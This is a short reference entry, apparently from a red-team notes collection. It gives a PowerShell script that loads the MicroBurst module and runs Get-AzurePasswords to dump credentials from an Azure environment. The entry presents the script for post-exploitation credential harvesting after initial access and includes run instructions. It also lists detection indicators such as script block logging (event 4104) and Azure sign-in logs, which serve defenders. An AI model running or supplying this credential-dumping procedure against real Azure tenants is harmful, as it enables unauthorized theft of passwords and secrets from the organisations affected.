---
type: code
language: powershell
verified: true
platforms:
  - Azure
  - Windows
tags:
  - azure
  - credential-dump
  - script
validated: true
---

# Microburst-Azure-Password-Retrieval-Script

## Code

```powershell
# Import the module
Import-Module Microburst.psm1

# Retrieve Azure Passwords
Get-AzurePasswords

# Retrieve Azure Passwords in a graphical grid
Get-AzurePasswords -Verbose | Out-GridView
```

## Description

This PowerShell script imports the Microburst module and retrieves Azure passwords using Get-AzurePasswords, then optionally displays them in a GridView for review. It automates the credential dumping process in an Azure environment, useful for quick post-exploitation credential harvesting.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Script uses current PowerShell context and module path; no user-defined variables | N/A |

## Usage

Save as a .ps1 file and execute in an authenticated PowerShell session with Microburst.psm1 available: powershell.exe -File retrieve_azure_passwords.ps1. Ensure Azure authentication (e.g., Connect-AzAccount) is established beforehand. Used in red team operations for dumping Azure credentials after initial access.

## Detection

- PowerShell execution logs showing Import-Module Microburst or Get-AzurePasswords calls.
- Azure AD sign-in logs for unusual API queries to credential endpoints.
- Windows Event Logs (ID 4104) for script block logging containing these cmdlets.
- Network traffic to Azure endpoints with credential-related Graph API requests.

## Related

- [[procedures/Retrieve-Azure-Passwords-Using-Microburst]]
- [[tools/Microburst]]
